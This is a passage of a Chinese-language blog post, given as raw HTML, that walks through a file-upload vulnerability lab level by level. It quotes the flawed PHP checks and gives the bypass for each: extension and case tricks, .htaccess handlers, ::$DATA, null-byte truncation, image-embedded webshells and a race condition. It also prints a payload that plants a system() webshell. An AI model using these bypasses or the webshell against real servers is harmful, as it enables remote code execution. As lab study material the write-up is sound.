class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">           $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">           $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">           <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">               $is_upload = <span class="keyword">true</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>服务器端Content-Type类型检测，burp抓包修改。</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">    $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">    $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>黑名单检测</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>可通过php,pht,phtml，php5,phps绕过<br>不过需配置httpd.conf<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>上传.htaccess文件。<br>需配置 <code>mod_rewrite</code> 和<code>AllowOverride All</code><br>配置方式：<br><code>AllowOverride All</code><br><code>LoadModule rewrite_module modules/mod_rewrite.so</code><br>.htaccess内容为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"shell.jpg"</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>shell.jpg文件可被解析为php文件</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">    $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">    $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>黑名单过滤绝大部分后缀，可以使用上传.htaccess文件绕过，方法同上</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">     $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">     $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">     $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">     $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">     $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">     $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>过滤.htaccess文件，未进行大小写处理，通过上传.Php绕过。（Windows特性忽略文件大小写）</p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">    $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>未进行去掉末尾空格的处理，上传<code>shell.php</code>即可。Windows会自动去除文件末尾的点和空格</p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">    $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">    $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>未去除末尾的点，可以上传<code>shell.php.</code>绕过</p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">    $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">    $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>未进行::$DATA处理。NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。<br>参考<br><a href="https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream" target="_blank" rel="noopener">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</a><br>上传<code>shell.php::$DATA</code>进行bypass</p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>, <span class="string">".php5"</span>, <span class="string">".php4"</span>, <span class="string">".php3"</span>, <span class="string">".php2"</span>, <span class="string">".html"</span>, <span class="string">".htm"</span>, <span class="string">".phtml"</span>, <span class="string">".pht"</span>, <span class="string">".pHp"</span>, <span class="string">".pHp5"</span>, <span class="string">".pHp4"</span>, <span class="string">".pHp3"</span>, <span class="string">".pHp2"</span>, <span class="string">".Html"</span>, <span class="string">".Htm"</span>, <span class="string">".pHtml"</span>, <span class="string">".jsp"</span>, <span class="string">".jspa"</span>, <span class="string">".jspx"</span>, <span class="string">".jsw"</span>, <span class="string">".jsv"</span>, <span class="string">".jspf"</span>, <span class="string">".jtml"</span>, <span class="string">".jSp"</span>, <span class="string">".jSpx"</span>, <span class="string">".jSpa"</span>, <span class="string">".jSw"</span>, <span class="string">".jSv"</span>, <span class="string">".jSpf"</span>, <span class="string">".jHtml"</span>, <span class="string">".asp"</span>, <span class="string">".aspx"</span>, <span class="string">".asa"</span>, <span class="string">".asax"</span>, <span class="string">".ascx"</span>, <span class="string">".ashx"</span>, <span class="string">".asmx"</span>, <span class="string">".cer"</span>, <span class="string">".aSp"</span>, <span class="string">".aSpx"</span>, <span class="string">".aSa"</span>, <span class="string">".aSax"</span>, <span class="string">".aScx"</span>, <span class="string">".aShx"</span>, <span class="string">".aSmx"</span>, <span class="string">".cEr"</span>, <span class="string">".sWf"</span>, <span class="string">".swf"</span>, <span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>未进行循环处理点和空格。<br>构造<code>sky.php. .</code>处理后变成<code>sky.php.</code> </p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">    $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">        $is_upload = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关键函数str_ireplace，未循环过滤可通过双写绕过,<code>shell.pphphp</code>经过处理变成shell.php<br><img src="https://i.imgur.com/IBvA7WL.png" alt=""></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>image_path我们可控，上传shell.jpg，利用../upload/shell.php%00截断路径。保存的文件就是shell.php</p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>同11，只是GET变为POST，在hex将20改为00，使用00截断bypass<br><img src="https://i.imgur.com/4Oe631N.png" alt=""></p><h1 id="图片解析问题"><a href="#图片解析问题" class="headerlink" title="图片解析问题"></a>图片解析问题</h1><p>上传带小马的图片</p><p>copy 1.jpg/b+ 1.php/a shell.jpg<br>或者<br>hex中加一句话木马<br><img src="https://i.imgur.com/xeeXXzR.png" alt=""></p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>unpack函数</p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>getimagesize函数，绕过同13</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>exif_imagetype函数，绕过同14</p><h2 id="16二次渲染"><a href="#16二次渲染" class="headerlink" title="16二次渲染"></a>16二次渲染</h2><p>判断后缀和Content-type,利用imagecreatefromif判断是否为gif照片<br>，上传之后会进行2次渲染。因此需要找到二次渲染前后没有变化位置插入php代码可成功上传，参考<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a>。png和jpg麻烦</p><h2 id="17条件竞争"><a href="#17条件竞争" class="headerlink" title="17条件竞争"></a>17条件竞争</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数执行流程是判断是否在白名单，不再白名单自动删除，由此可想到条件竞争，burp一边删除一边访问。可成功上传。</p><p>上传内容一般为<br><code>&lt;?php $c=fopen(&#39;/app/intrd&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php system($_GET[&quot;f&quot;]);?&gt;&#39;);?&gt;</code></p><h2 id="15-1"><a href="#15-1" class="headerlink" title="15"></a>15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 